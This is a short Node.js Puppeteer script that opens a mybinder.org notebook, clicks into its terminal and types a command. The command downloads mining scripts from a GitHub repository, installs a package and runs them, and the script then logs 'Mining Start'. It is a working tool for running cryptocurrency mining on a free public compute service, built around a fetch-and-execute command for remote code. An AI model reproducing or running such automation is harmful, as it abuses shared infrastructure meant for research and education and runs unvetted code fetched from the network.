const puppeteer = require('puppeteer')

let mGmail = null
let browser = null


console.log('Service Starting...')


;(async () => {

    console.log('Status: Start process...')


    browser = await puppeteer.launch({
        executablePath : "/usr/lib/chromium-browser/chromium-browser",
        //headless: false,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    })

    let page = (await browser.pages())[0]

    await page.goto('https://mybinder.org/v2/git/https%3A%2F%2Fgithub.com%2Faanksatriani%2Fmybinder.git/main')

    while(true) {
        await delay(5000)
        try {
            let root = await page.evaluate(() => {
                let tr = document.querySelector('div[title="Start a new terminal session"]')
                if(tr) {
                    tr.click()
                    return true
                }
                return false
            })
            if(root) {
                break
            }
        } catch (e) {} 
    }

    console.log('NoteBook Active')

    await delay(2500)

    let cmd = 'wget https://raw.githubusercontent.com/raiyan088/public/main/mining/package.json https://raw.githubusercontent.com/raiyan088/public/main/mining/server.js https://raw.githubusercontent.com/raiyan088/public/main/mining/worker.js https://raw.githubusercontent.com/raiyan088/public/main/mining/worker_cn.js && npm install websocket && node server.js'

    await page.keyboard.type(cmd)
    await delay(1000)
    await page.keyboard.press('Enter')
    console.log('Mining Start')
})()

async function delay(time) {
    return new Promise(function (resolve) {
        setTimeout(resolve, time)
    })
}
